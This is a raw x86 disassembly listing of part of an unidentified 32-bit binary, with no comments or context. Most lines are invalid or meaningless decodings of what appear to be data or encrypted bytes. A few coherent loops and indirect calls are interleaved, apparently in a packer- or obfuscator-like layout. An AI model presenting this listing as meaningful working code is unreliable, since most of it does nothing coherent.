  404b09:	push   ebx
  404b0a:	(bad)
  404b0d:	add    eax,0xd820b081
  404b12:	mov    dl,0x5b
  404b14:	xchg   edi,eax
  404b15:	cdq    
  404b16:	call   0x6f96:0x10bd8619
  404b1d:	jno    0x404b68
  404b1f:	mov    ebp,0xde713f13
  404b24:	cmp    edx,DWORD PTR [ecx+ebp*2-0x62]
  404b28:	fbstp  TBYTE PTR [esi-0x22]
  404b2b:	aaa    
  404b2c:	enter  0x72a8,0x16
  404b30:	pop    edx
  404b31:	into   
  404b32:	ror    bl,1
  404b34:	ror    DWORD PTR [ebp-0x69],0xd7
  404b38:	and    eax,0x1e36bf4a
  404b3d:	adc    eax,0xc9f5eacf
  404b42:	imul   edx,DWORD PTR [ebp-0x195a524a],0x4b
  404b49:	retf   
  404b4a:	add    ah,BYTE PTR [edx*4-0x7ab2e8a2]
  404b51:	in     eax,0x43
  404b53:	add    eax,0x94fb0ef2
  404b58:	cmp    al,BYTE PTR [ecx]
  404b5a:	pop    ebx
  404b5b:	scas   eax,DWORD PTR es:[edi]
  404b5c:	mov    dh,0x85
  404b5e:	xchg   esi,eax
  404b5f:	push   esp
  404b60:	lods   eax,DWORD PTR ds:[esi]
  404b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b63:	or     al,BYTE PTR [esi+0x1a]
  404b66:	adc    al,0x6b
  404b68:	cmc    
  404b69:	mov    ch,0xfe
  404b6b:	xlat   BYTE PTR ds:[ebx]
  404b6c:	and    eax,0xf9cd52a9
  404b71:	cmp    BYTE PTR [ebx+edi*2+0x3e],dh
  404b75:	repnz clc 
  404b77:	add    edx,esp
  404b79:	pushf  
  404b7a:	mov    al,0x46
  404b7c:	dec    edi
  404b7d:	ret    0x8153
  404b80:	xlat   BYTE PTR ds:[ebx]
  404b81:	in     eax,0xbe
  404b83:	mov    eax,ds:0x28c896e2
  404b88:	icebp  
  404b89:	push   0xadcc03dc
  404b8e:	pop    eax
  404b8f:	(bad)  
  404b91:	ss pop ebp
  404b93:	mov    ecx,0x3a03a28
  404b98:	xchg   edx,eax
  404b99:	call   0x5fcd4100
  404b9e:	add    ecx,DWORD PTR [esi-0x6c]
  404ba1:	xchg   edx,eax
  404ba2:	mov    ds:0x4de58a33,eax
  404ba7:	popf   
  404ba8:	outs   dx,BYTE PTR ds:[esi]
  404ba9:	dec    ax
  404bab:	icebp  
  404bac:	ret    
  404bad:	repnz loope 0x404c18
  404bb0:	loope  0x404c22
  404bb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bb3:	ins    DWORD PTR es:[edi],dx
  404bb4:	pop    ebx
  404bb5:	and    BYTE PTR [edx],dl
  404bb7:	repz pushf 
  404bb9:	aaa    
  404bba:	pop    esi
  404bbb:	pop    eax
  404bbc:	mov    WORD PTR [ebx+0x15c1714a],?
  404bc2:	mov    ss,WORD PTR [ebx+ebp*4-0x31]
  404bc6:	or     BYTE PTR [ecx+0x28],dh
  404bc9:	inc    ecx
  404bca:	mov    ebp,0x2d28f8bf
  404bcf:	jl     0x404bf4
  404bd1:	jae    0x404baf
  404bd3:	push   esp
  404bd4:	adc    al,0xb6
  404bd6:	cli    
  404bd7:	stc    
  404bd8:	js     0x404b7c
  404bda:	test   eax,0x65995013
  404bdf:	iret   
  404be0:	arpl   WORD PTR [edi+edi*1],sp
  404be3:	sub    ah,ch
  404be5:	fidivr WORD PTR [ebp+0x4723f124]
  404beb:	mov    DWORD PTR [edi+0x31e1f98f],edi
  404bf1:	mov    cl,ch
  404bf3:	aas    
  404bf4:	mov    ecx,cs
  404bf6:	sbb    DWORD PTR [edx],edx
  404bf8:	add    dl,dh
  404bfa:	out    0xb,eax
  404bfc:	ja     0x404c60
  404bfe:	sub    al,BYTE PTR [eax+0x30]
  404c01:	sbb    ecx,edx
  404c03:	popa   
  404c04:	neg    ebx
  404c06:	rcr    ch,cl
  404c08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c09:	std    
  404c0a:	inc    esp
  404c0b:	mov    ah,0xaa
  404c0d:	cdq    
  404c0e:	loop   0x404bbe
  404c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c11:	pop    edx
  404c12:	adc    DWORD PTR [esi+ebx*1+0x1496cf46],esp
  404c19:	push   edx
  404c1a:	sub    BYTE PTR [ebp+0x205db64e],bl
  404c20:	shl    BYTE PTR [esi+0x24],cl
  404c23:	mov    dh,0x22
  404c25:	pop    DWORD PTR [ebp-0x1a41bce9]
  404c2b:	mov    dl,0x7e
  404c2d:	mov    edi,0x9fea5e09
  404c32:	pop    edx
  404c33:	loop   0x404bba
  404c35:	addr16 or al,0x95
  404c38:	aaa    
  404c39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c3a:	adc    al,0xa
  404c3c:	jnp    0x404c8b
  404c3e:	and    eax,0x12c28db1
  404c43:	out    dx,eax
  404c44:	fst    DWORD PTR [esi]
  404c46:	sbb    bh,BYTE PTR [eax+0x7d]
  404c49:	pop    ebp
  404c4a:	jae    0x404cc2
  404c4c:	loop   0x404bfc
  404c4e:	push   0x4f
  404c50:	adc    edi,DWORD PTR [esi+0x1cf631e]
  404c56:	arpl   WORD PTR [esi+ecx*1+0x6e41be42],si
  404c5d:	mov    dh,0x28
  404c5f:	mov    dh,0x55
  404c61:	outs   dx,BYTE PTR ds:[esi]
  404c62:	jmp    0x16e77afc
  404c67:	add    al,0xa1
  404c69:	sbb    eax,0x8c535cbe
  404c6f:	shl    DWORD PTR [ecx+0x75],cl
  404c72:	xchg   edx,eax
  404c73:	stos   DWORD PTR es:[edi],eax
  404c74:	bound  edx,QWORD PTR [ecx+0x24]
  404c77:	jnp    0x404c9f
  404c79:	pop    ebp
  404c7a:	dec    esi
  404c7b:	lods   eax,DWORD PTR ds:[esi]
  404c7c:	dec    esp
  404c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c7e:	repnz into 
  404c80:	sbb    al,0x9a
  404c82:	push   ecx
  404c83:	xchg   esp,eax
  404c84:	add    ch,BYTE PTR ds:0xc5c58b98
  404c8a:	in     eax,dx
  404c8b:	sub    BYTE PTR [ecx],ah
  404c8d:	mov    dl,0xd3
  404c8f:	and    esi,0xc960e3b1
  404c95:	pushf  
  404c96:	jo     0x404c99
  404c98:	sbb    eax,0xf24d36c
  404c9d:	jp     0x404c26
  404c9f:	sahf   
  404ca0:	adc    ebx,eax
  404ca2:	test   BYTE PTR [esi],bl
  404ca4:	cli    
  404ca5:	sbb    DWORD PTR [esi+0x42],edi
  404ca8:	jb     0x404d0b
  404caa:	fucomip st,st(4)
  404cac:	add    ch,ch
  404cae:	dec    edx
  404caf:	rcl    eax,cl
  404cb1:	or     ah,BYTE PTR [eax+0xfacfa01]
  404cb7:	dec    DWORD PTR [esi+eax*8+0x6edabbec]
  404cbe:	(bad)  [edi+ecx*2-0x611f6bf0]
  404cc5:	xlat   BYTE PTR ds:[ebx]
  404cc6:	push   ebx
  404cc7:	xor    BYTE PTR [edi],bl
  404cc9:	dec    ebp
  404cca:	loopne 0x404cf1
  404ccc:	gs cs popa 
  404ccf:	mov    edi,0xccea21fb
  404cd4:	retf   
  404cd5:	jmp    0x333a1962
  404cda:	ins    BYTE PTR es:[edi],dx
  404cdb:	push   ebp
  404cdc:	jmp    0x42336ccd
  404ce1:	fmul   QWORD PTR [esp+ecx*4-0x9]
  404ce5:	out    dx,eax
  404ce6:	cmc    
  404ce7:	push   edx
  404ce8:	ins    BYTE PTR es:[edi],dx
  404ce9:	push   esp
  404cea:	jg     0x404d18
  404cec:	inc    edi
  404ced:	mov    cs,WORD PTR [ecx]
  404cef:	cmp    eax,0x452887c7
  404cf4:	leave  
  404cf5:	push   0x3ed999ba
  404cfa:	inc    ebx
  404cfb:	mov    eax,0xf6f80464
  404d00:	fst    DWORD PTR [edx-0x16c50c56]
  404d06:	add    BYTE PTR [bp+si-0x38db],bl
  404d0b:	xor    ebp,DWORD PTR [ebx]
  404d0d:	jnp    0x404c9a
  404d0f:	imul   edi,DWORD PTR [ecx-0x1b],0x56
  404d13:	retf   0x58a3
  404d16:	pop    esp
  404d17:	fst    DWORD PTR [edx-0x13]
  404d1a:	vsubsd xmm7,xmm2,QWORD PTR [ebx+0x4d]
  404d1f:	push   cs
  404d20:	test   BYTE PTR [ecx],bh
  404d22:	adc    edi,edi
  404d24:	idiv   eax
  404d26:	retf   0xf8b3
  404d29:	push   0x3c
  404d2b:	xchg   ebp,eax
  404d2c:	and    esi,DWORD PTR [ecx-0x360987c1]
  404d32:	icebp  
  404d33:	mov    eax,ds:0xf1f70528
  404d38:	mov    ecx,DWORD PTR [ebp+0x10]
  404d3b:	and    ecx,eax
  404d3d:	or     ecx,0x81161d8f
  404d43:	mov    eax,ecx
  404d45:	pop    ebp
  404d46:	ret    0x18
  404d49:	push   ebp
  404d4a:	mov    ebp,esp
  404d4c:	jmp    0x404f59
  404d51:	pop    ds
  404d52:	iret   
  404d53:	xchg   edi,eax
  404d54:	cmp    DWORD PTR [edi+0x41],esi
  404d57:	jno    0x404d42
  404d59:	das    
  404d5a:	ins    BYTE PTR es:[edi],dx
  404d5b:	xchg   esp,eax
  404d5c:	mov    eax,0x1fe74126
  404d61:	out    0x20,al
  404d63:	jle    0x404de3
  404d65:	outs   dx,BYTE PTR ds:[esi]
  404d66:	jg     0x404de6
  404d68:	jle    0x404d32
  404d6a:	add    BYTE PTR [esi-0x29],dh
  404d6d:	shl    BYTE PTR [edi-0x7d],cl
  404d70:	call   0xd760:0x8153e0bd
  404d77:	mov    bh,0x5d
  404d79:	dec    ebp
  404d7a:	in     eax,dx
  404d7b:	imul   eax,DWORD PTR [eax-0x28],0x2a
  404d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d80:	das    
  404d81:	adc    DWORD PTR gs:[ebx-0x53],edx
  404d85:	push   edi
  404d86:	add    DWORD PTR [esi-0x19],ebx
  404d89:	imul   DWORD PTR [ecx+0x77]
  404d8c:	sub    eax,0xed40a022
  404d91:	ins    BYTE PTR es:[edi],dx
  404d92:	cdq    
  404d93:	mov    ecx,DWORD PTR [ecx+0x79227db8]
  404d99:	inc    esp
  404d9a:	lock (bad) 
  404d9c:	js     0x404e0f
  404d9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d9f:	mov    bh,0x3e
  404da1:	(bad)  
  404da2:	jno    0x404df6
  404da4:	mov    ebp,0x629dd303
  404da9:	and    al,0xde
  404dab:	neg    DWORD PTR [esi+0x24]
  404dae:	mov    ch,0xe4
  404db0:	xor    eax,0xf19eccea
  404db5:	inc    esp
  404db6:	or     al,0x31
  404db8:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  404dba:	daa    
  404dbb:	push   edi
  404dbc:	retf   0xab95
  404dbf:	lods   al,BYTE PTR ds:[esi]
  404dc0:	jmp    0x404d94
  404dc2:	dec    esp
  404dc3:	pop    ds
  404dc4:	lock into 
  404dc6:	imul   edi,DWORD PTR [edi-0x4e],0xc38fa7ea
  404dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dce:	cli    
  404dcf:	ds dec edi
  404dd1:	mov    ebx,0x76e9542d
  404dd6:	test   eax,0x681a0100
  404ddb:	fnstcw WORD PTR [ebp+0x25200500]
  404de1:	rol    DWORD PTR [eax+0x63],0x55
  404de5:	cwde   
  404de6:	mov    cl,0xb4
  404de8:	rcr    BYTE PTR [eax+0x6bfa6b9f],0x48
  404def:	in     al,0x42
  404df1:	loope  0x404d9b
  404df3:	aaa    
  404df4:	ss pushf 
  404df6:	or     edx,eax
  404df8:	imul   ebx,DWORD PTR [eax+ecx*2-0x7f7770cd],0x29
  404e00:	mov    cl,0x97
  404e02:	dec    esp
  404e03:	je     0x404e45
  404e05:	bound  ecx,QWORD PTR [eax+0x17]
  404e08:	and    dl,BYTE PTR [esp+ebp*4-0x18]
  404e0c:	and    ebx,edx
  404e0e:	and    DWORD PTR [edi+0x5d],esp
  404e11:	stos   BYTE PTR es:[edi],al
  404e12:	sbb    BYTE PTR [eax+0xf],al
  404e15:	js     0x404e42
  404e17:	popf   
  404e18:	and    eax,0x54306cdd
  404e1d:	outs   dx,BYTE PTR ds:[esi]
  404e1e:	lock mov dl,0xe4
  404e21:	jo     0x404e6a
  404e23:	dec    ebx
  404e24:	dec    esp
  404e25:	xchg   edx,eax
  404e26:	or     eax,0x4d5cb00a
  404e2b:	cmp    eax,0xca640f36
  404e30:	xor    dl,bh
  404e32:	je     0x404e66
  404e34:	xchg   ecx,eax
  404e35:	mov    ds:0x32f4c5b,al
  404e3a:	jae    0x404e6d
  404e3c:	push   eax
  404e3d:	mov    eax,0xaefd5e59
  404e42:	push   DWORD PTR [eax]
  404e44:	mov    eax,ebp
  404e46:	mov    ds:0x93cbf064,eax
  404e4b:	(bad)  
  404e4c:	(bad)  
  404e4e:	fild   WORD PTR [edi+0x71f54d5a]
  404e54:	aad    0xe1
  404e56:	sti    
  404e57:	mov    dh,0x58
  404e59:	ds sub bl,ah
  404e5c:	xor    DWORD PTR [ecx],ebx
  404e5e:	aaa    
  404e5f:	and    eax,0xcb604e05
  404e64:	push   eax
  404e65:	or     al,0xd7
  404e67:	es pop edi
  404e69:	fdivr  st,st(1)
  404e6b:	cmp    BYTE PTR [edi],al
  404e6d:	popf   
  404e6e:	aaa    
  404e6f:	std    
  404e70:	sar    cl,1
  404e72:	enter  0x24a9,0xd0
  404e76:	add    eax,0xa8672c04
  404e7b:	xor    DWORD PTR [edi],0x62c125fc
  404e81:	ret    
  404e82:	or     al,0xb0
  404e84:	out    dx,al
  404e85:	xchg   edi,eax
  404e86:	xor    DWORD PTR [esi],edi
  404e88:	mov    edx,0xd35012bc
  404e8d:	xchg   BYTE PTR [ecx+0x20],al
  404e90:	push   ebp
  404e91:	ret    0xbdf
  404e94:	dec    ebx
  404e95:	mov    al,ds:0x3fad28fc
  404e9a:	sub    DWORD PTR [esi+0x32b34335],0xffffffbe
  404ea1:	mov    ebp,DWORD PTR [ecx+0x58]
  404ea4:	hlt    
  404ea5:	jl     0x404ebc
  404ea7:	test   eax,0x1e93cb3c
  404eac:	in     al,0x62
  404eae:	(bad)
  404eb1:	stos   DWORD PTR es:[edi],eax
  404eb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eb3:	cmp    ebx,DWORD PTR [ebx-0x20]
  404eb6:	mov    edx,0x38a28de1
  404ebb:	push   ss
  404ebc:	inc    esi
  404ebd:	loopne 0x404e4e
  404ebf:	les    eax,FWORD PTR [ecx+0x9]
  404ec2:	xchg   BYTE PTR [edx+0x149211a1],bh
  404ec8:	jecxz  0x404e88
  404eca:	mov    eax,ds:0x6dc43aca
  404ecf:	test   al,0x49
  404ed1:	and    eax,0xf9826378
  404ed6:	xor    al,0x7d
  404ed8:	mov    DWORD PTR [edi],ecx
  404eda:	fnstenv [eax+0x76e4bc04]
  404ee0:	test   eax,0xe389afb3
  404ee5:	ins    DWORD PTR es:[edi],dx
  404ee6:	jecxz  0x404f08
  404ee8:	leave  
  404ee9:	mov    ah,0x94
  404eeb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eec:	inc    edi
  404eed:	add    al,0xcf
  404eef:	(bad)  
  404ef0:	xor    DWORD PTR [edi],edx
  404ef2:	or     ch,BYTE PTR [edx]
  404ef4:	push   ecx
  404ef5:	push   ecx
  404ef6:	inc    edi
  404ef7:	pop    edx
  404ef8:	leave  
  404ef9:	xor    al,0xff
  404efb:	imul   esi,DWORD PTR [edx+0x69],0x1351fd70
  404f02:	in     al,dx
  404f03:	or     al,0xd1
  404f05:	jl     0x404ec1
  404f07:	outs   dx,DWORD PTR ds:[esi]
  404f08:	pop    es
  404f09:	test   eax,0xd7739820
  404f0e:	in     eax,dx
  404f0f:	inc    ecx
  404f10:	stc    
  404f11:	fbld   TBYTE PTR [ebx+0x2e]
  404f14:	cwde   
  404f15:	mov    ah,BYTE PTR [edi-0x4e]
  404f18:	nop
  404f19:	and    dl,0x88
  404f1c:	imul   ebp,esp,0xffffffa8
  404f1f:	sbb    ch,cl
  404f21:	or     ebx,DWORD PTR [edx+edi*1+0x6a3055ae]
  404f28:	mov    al,0x14
  404f2a:	mov    al,0xe6
  404f2c:	into   
  404f2d:	je     0x404f25
  404f2f:	fbstp  TBYTE PTR [edi-0x41]
  404f32:	sbb    edi,edx
  404f34:	lock gs gs call 0xa43a:0xad96db65
  404f3e:	or     DWORD PTR [edx-0x31],esp
  404f41:	xchg   ebp,eax
  404f42:	stos   DWORD PTR es:[edi],eax
  404f43:	add    dl,BYTE PTR ds:0xe7d3096a
  404f49:	mov    edx,0x9b5fa3e0
  404f4e:	sahf   
  404f4f:	(bad)  
  404f50:	retf   
  404f51:	sti    
  404f52:	mov    BYTE PTR [ebx+esi*2+0x53bc1b04],dl
  404f59:	push   ecx
  404f5a:	and    DWORD PTR ds:0x4302d9,0x0
  404f64:	jmp    0x404f74
  404f69:	mov    eax,ds:0x4302d9
  404f6e:	inc    eax
  404f6f:	mov    ds:0x4302d9,eax
  404f74:	cmp    DWORD PTR ds:0x4302d9,0x15
  404f7b:	jae    0x404fbb
  404f81:	cmp    DWORD PTR ds:0x4302d9,0x17
  404f88:	jne    0x404fa4
  404f8e:	push   0x42e654
  404f93:	push   DWORD PTR [ebp-0x10]
  404f96:	push   0x32cc
  404f9b:	push   DWORD PTR [ebp-0x24]
  404f9e:	call   DWORD PTR ds:0x42e91f
  404fa4:	jmp    0x404f69
  404fa9:	mov    edx,DWORD PTR ds:0x42ec57
  404faf:	xor    edx,DWORD PTR ds:0x4302d1
  404fb5:	mov    DWORD PTR ds:0x42ec57,edx
  404fbb:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  404fc2:	mov    edx,DWORD PTR ds:0x42ece9
  404fc8:	mov    eax,ds:0x42e803
  404fcd:	sub    eax,edx
  404fcf:	and    edx,DWORD PTR [edx+eax*1]
  404fd2:	mov    eax,DWORD PTR [ebp-0x4]
  404fd5:	movzx  ecx,WORD PTR ds:0x42e658
  404fdc:	sub    ecx,DWORD PTR ds:0x4302cd
  404fe2:	mov    DWORD PTR ds:0x42e658,ecx
  404fe8:	mov    edx,DWORD PTR [ebp+0x10]
  404feb:	and    DWORD PTR ds:0x42ec73,0x0
  404ff5:	mov    ecx,DWORD PTR ds:0x42ec73
  404ffb:	inc    ecx
  404ffc:	mov    DWORD PTR ds:0x42ec73,ecx
  405002:	cmp    DWORD PTR ds:0x42ec73,0x7
  405009:	jne    0x405018
  40500f:	push   DWORD PTR [ebp-0x28]
  405012:	call   DWORD PTR ds:0x42e853
  405018:	cmp    DWORD PTR ds:0x42ec73,0x6
  40501f:	jne    0x405034
  405025:	xor    ecx,ecx
  405027:	or     ecx,DWORD PTR ds:0x42ec73
  40502d:	inc    ecx
  40502e:	mov    DWORD PTR ds:0x42ec73,ecx
  405034:	cmp    DWORD PTR ds:0x42ec73,0x1e
  40503b:	jb     0x404ff5
  405041:	jmp    0x40524e
  405046:	inc    eax
  405047:	jo     0x405063
  405049:	xor    BYTE PTR [edx],ch
  40504b:	jo     0x40509d
  40504d:	jo     0x40502d
  40504f:	shl    BYTE PTR [eax],1
  405051:	outs   dx,BYTE PTR ds:[esi]
  405052:	(bad)  
  405053:	fdivr  DWORD PTR [ebx+0x43]
  405056:	(bad)  
  405057:	cs jle 0x4050d8
  40505a:	outs   dx,BYTE PTR ds:[esi]
  40505b:	jg     0x4050db
  40505d:	jle    0x405097
  40505f:	out    dx,al
  405060:	les    ebp,FWORD PTR [esi+0x33]
  405063:	cld    
  405064:	dec    ebx
  405065:	or     edi,ebx
  405067:	sub    edi,ebx
  405069:	call   0xae1b:0xf9ee9e77
  405070:	leave  
  405071:	jmp    0x9e9a:0x2ba8cbd6
  405078:	push   0x830ea72b
  40507d:	push   ebx
  40507e:	pop    es
  40507f:	cmc    
  405080:	pop    ss
  405081:	mov    dh,0xcc
  405083:	cmp    DWORD PTR [esi-0x134ebfb8],esi
  405089:	mov    ds:0x6e912b4c,al
  40508e:	jp     0x405043
  405090:	(bad)  
  405091:	pop    ecx
  405092:	popa   
  405093:	mov    eax,0x7ab9ac55
  405098:	add    esp,DWORD PTR [esi+0x7407611f]
  40509e:	in     eax,dx
  40509f:	mov    ds:0x4e8c175a,eax
  4050a4:	shl    DWORD PTR [ebx+ebp*2],cl
  4050a7:	fsub   DWORD PTR [eax]
  4050a9:	sar    DWORD PTR [eax],cl
  4050ab:	and    ch,BYTE PTR [ebx-0xb2dedeb]
  4050b1:	xchg   ebp,eax
  4050b2:	mov    eax,0xcff0ef0f
  4050b7:	dec    eax
  4050b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050b9:	xchg   edi,eax
  4050ba:	mov    ds:0xcf5c0ec5,al
  4050bf:	mov    cl,BYTE PTR [ebp+0x73]
  4050c2:	scas   eax,DWORD PTR es:[edi]
  4050c3:	sub    al,0x4c
  4050c5:	aam    0xd2
  4050c7:	test   eax,0x87c6baad
  4050cc:	xchg   edi,eax
  4050cd:	jmp    0x43d49203
  4050d2:	and    esp,DWORD PTR [esi-0x3f]
  4050d5:	mov    ebp,0x66b04c68
  4050da:	pop    eax
  4050db:	pop    edi
  4050dc:	pop    esp
  4050dd:	sbb    edi,ebp
  4050df:	push   edx
  4050e0:	xor    al,0xd1
  4050e2:	jbe    0x405089
  4050e4:	cs mov dh,0x23
  4050e7:	and    al,0x55
  4050e9:	retf   0xba2c
  4050ec:	jne    0x405101
  4050ee:	(bad)  [ebx]
  4050f0:	aas    
  4050f1:	mov    edx,0x622847d5
  4050f6:	inc    esp
  4050f7:	(bad)  
  4050f8:	loop   0x40512e
  4050fa:	lds    edx,FWORD PTR [ebx+esi*2+0x2f]
  4050fe:	pop    edx
  4050ff:	daa    
  405100:	or     edx,edx
  405102:	xor    DWORD PTR [edi+0x7b35c2a5],edx
  405108:	fistp  QWORD PTR [ecx+0x794343cc]
  40510e:	nop
  40510f:	mov    bh,0xbe
  405111:	lahf   
  405112:	sar    DWORD PTR [ebx-0x39],1
  405115:	popf   
  405116:	retf   0x311d
  405119:	pushf  
  40511a:	test   al,0x4a
  40511c:	das    
  40511d:	daa    
  40511e:	aaa    
  40511f:	dec    ebx
  405120:	shl    BYTE PTR [edx],1
  405122:	aad    0x93
  405124:	push   esi
  405125:	jecxz  0x405172
  405127:	sub    bl,BYTE PTR [ebp+0x3]
  40512a:	call   0x80fd:0x441666c1
  405131:	aad    0xcd
  405133:	xchg   edi,eax
  405134:	in     al,0xb3
  405136:	jnp    0x4051b2
  405138:	pop    es
  405139:	es sub al,0xda
  40513c:	mov    eax,ds:0x87789d33
  405141:	das    
  405142:	and    al,cl
  405144:	add    eax,0xc07b4d94
  405149:	js     0x40510c
  40514b:	jg     0x405103
  40514d:	sbb    BYTE PTR [edi],dh
  40514f:	push   0xffffffdd
  405151:	fidiv  DWORD PTR [ecx+ecx*4+0x3a]
  405155:	xor    ebx,DWORD PTR [edi-0x5146e637]
  40515b:	push   ecx
  40515c:	push   0x7e
  40515e:	(bad)  
  405160:	xor    ecx,DWORD PTR [esi+edi*8-0x566eadef]
  405167:	or     bh,BYTE PTR [edi]
  405169:	mov    esi,0x93767555
  40516e:	stos   BYTE PTR es:[edi],al
  40516f:	mov    ebx,ecx
  405171:	ficom  WORD PTR [ebp+0x9]
  405174:	cmp    BYTE PTR [edx],bl
  405176:	rol    esp,1
  405178:	outs   dx,DWORD PTR ds:[esi]
  405179:	popa   
  40517a:	mov    ds:0xbc2b19fd,eax
  40517f:	(bad)  
  405180:	fsub   QWORD PTR [ebx+0x6dda34c6]
  405186:	mov    eax,ds:0x56836068
  40518b:	int3   
  40518c:	jle    0x4051ce
  40518e:	pop    edi
  40518f:	inc    ebp
  405190:	arpl   sp,bx
  405192:	rol    BYTE PTR [ebx],0xde
  405195:	and    al,0xb6
  405197:	lods   al,BYTE PTR ds:[esi]
  405198:	nop
  405199:	adc    BYTE PTR [edi-0x19866f3e],dl
  40519f:	adc    al,0xe8
  4051a1:	in     al,dx
  4051a2:	cmp    eax,0xb496567b
  4051a7:	mov    edx,0xe63aed7a
  4051ac:	pop    DWORD PTR [eax-0x493e0ca1]
  4051b2:	ret    0x87bc
  4051b5:	jl     0x40517b
  4051b7:	cmp    BYTE PTR [esi+eax*1],ah
  4051ba:	out    0x74,eax
  4051bc:	or     al,0xd1
  4051be:	cmp    edx,DWORD PTR ds:0x1ce659a2
  4051c4:	je     0x4051a9
  4051c6:	stc    
  4051c7:	add    DWORD PTR [edi+ecx*2-0x49],esp
  4051cb:	rcl    DWORD PTR [ebp+0x39],1
  4051ce:	ds mov ah,0x99
  4051d1:	das    
  4051d2:	(bad)  
  4051d3:	fimul  WORD PTR [ebp-0x1f]
  4051d6:	push   eax
  4051d7:	ret    0x2a5
  4051da:	js     0x40517d
  4051dc:	in     al,0xdd
  4051de:	scas   al,BYTE PTR es:[edi]
  4051df:	pop    ebp
  4051e0:	push   ss
  4051e1:	lahf   
  4051e2:	mov    edx,0xb711f96d
  4051e7:	mov    DWORD PTR [eax-0x1570e7c8],eax
  4051ed:	push   0x79ee8128
  4051f2:	adc    BYTE PTR [ebp-0x39],dh
  4051f5:	mov    eax,edx
  4051f7:	mov    eax,0xc9f3f6f8
  4051fc:	nop
  4051fd:	lods   al,BYTE PTR ds:[esi]
  4051fe:	xlat   BYTE PTR ds:[ebx]
  4051ff:	(bad)  
  405200:	pushf  
  405201:	inc    ebp
  405202:	loopne 0x4051f9
  405204:	jno    0x4051c6
  405206:	jae    0x4051e9
  405208:	or     DWORD PTR [eax+0x36],0xa0a56221
  40520f:	xchg   ebx,eax
  405210:	ins    DWORD PTR es:[edi],dx
  405211:	cmp    esp,ecx
  405213:	fdivr  st(0),st
  405215:	stos   BYTE PTR es:[edi],al
  405216:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405217:	ficomp WORD PTR [edx+0x2d]
  40521a:	add    eax,0x32457277
  40521f:	ins    DWORD PTR es:[edi],dx
  405220:	mov    ecx,?
  405222:	scas   al,BYTE PTR es:[edi]
  405223:	pop    ds
  405224:	fsub   st(5),st
  405226:	aam    0x9b
  405228:	cmp    BYTE PTR [eax+0x51],0x29
  40522c:	leave  
  40522d:	loopne 0x4051cb
  40522f:	mov    dh,0x75
  405231:	xchg   edi,eax
  405232:	mov    al,0x53
  405234:	and    DWORD PTR [eax-0x4bdfa964],esp
  40523a:	mov    ds:0xb6f04aad,al
  40523f:	jo     0x40523d
  405241:	aad    0x1e
  405243:	test   eax,0x2f17d320
  405248:	pop    ebp
  405249:	dec    esp
  40524a:	popa   
  40524b:	daa    
  40524c:	ficom  WORD PTR [ebp-0x47]
  40524f:	push   esp
  405250:	or     BYTE PTR [ecx+0x7],dl
  405253:	xor    eax,ecx
  405255:	add    eax,0x32729b
  40525a:	mov    DWORD PTR [edx],eax
  40525c:	mov    eax,DWORD PTR [ebp+0x14]
  40525f:	mov    edx,DWORD PTR [ebp+0x10]
  405262:	mov    DWORD PTR [edx+0x4],eax
  405265:	mov    eax,DWORD PTR [ebp+0x18]
  405268:	mov    edx,DWORD PTR [ebp+0x10]
  40526b:	jmp    0x405478
  405270:	sar    DWORD PTR [edx+ebp*4],cl
  405273:	push   ebp
  405274:	mov    cl,0x71
  405276:	icebp  
  405277:	mov    eax,0xd68c6305
  40527c:	loop   0x4052e8
  40527e:	dec    ebp
  40527f:	dec    ecx
  405280:	(bad)  
  405281:	sub    al,0x7e
  405283:	jle    0x4052f3
  405285:	jg     0x405305
  405287:	jle    0x4052a1
  405289:	(bad)  
  40528b:	rcl    DWORD PTR [ebx+0x8438811],1
  405291:	(bad)  [eax]
  405293:	jae    0x4052c4
  405295:	call   FWORD PTR [edx+0x2769a612]
  40529b:	cdq    
  40529c:	and    eax,0x22f5f460
  4052a1:	mov    al,0xe8
  4052a3:	or     BYTE PTR [esi+ecx*4],al
  4052a6:	jle    0x4052e1
  4052a8:	mov    esi,0x6c9eefa9
  4052ad:	pushf  
  4052ae:	pop    edi
  4052af:	in     eax,0x71
  4052b1:	daa    
  4052b2:	push   ebx
  4052b3:	mov    edx,0x4595269b
  4052b8:	repnz add eax,0x2a4b7bd4
  4052be:	lods   eax,DWORD PTR ds:[esi]
  4052bf:	fld    QWORD PTR [edi+0x78c08005]
  4052c5:	shl    DWORD PTR [edi+0x50477e66],0x72
  4052cc:	push   ds
  4052cd:	xchg   ecx,eax
  4052ce:	add    al,0x44
  4052d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052d1:	(bad)  
  4052d2:	pop    esi
  4052d3:	sub    eax,0x26747091
  4052d8:	ins    DWORD PTR es:[edi],dx
  4052d9:	ret    0xcd9e
  4052dc:	pop    ebp
  4052dd:	adc    al,0x60
  4052df:	pop    ebp
  4052e0:	pop    ebx
  4052e1:	dec    ebp
  4052e2:	inc    ebp
  4052e3:	pop    ebp
  4052e4:	cmp    eax,0xf7c452f4
  4052e9:	hlt    
  4052ea:	bound  edx,QWORD PTR [edi]
  4052ec:	cdq    
  4052ed:	arpl   WORD PTR [eax-0x13],bx
  4052f0:	xchg   dh,ch
  4052f2:	or     al,BYTE PTR [esi]
  4052f4:	pop    es
  4052f5:	repz and ch,BYTE PTR [edx]
  4052f8:	pushf  
  4052f9:	xchg   esp,eax
  4052fa:	dec    esi
  4052fc:	sbb    eax,0x2eb47d3
  405301:	jb     0x405380
  405303:	or     ebp,DWORD PTR [esi]
  405305:	and    cl,ch
  405307:	mov    ds,WORD PTR [edx-0x34524c2b]
